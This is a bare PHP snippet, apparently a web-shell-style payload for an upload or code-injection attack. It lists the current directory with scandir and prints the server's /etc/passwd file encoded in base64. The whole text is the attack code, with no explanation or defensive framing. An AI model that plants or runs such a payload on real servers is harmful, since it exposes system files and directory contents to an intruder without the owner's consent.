<?php
print_R(scandir('.'));
print(base64_encode(file_get_contents('/etc/passwd')));
?>
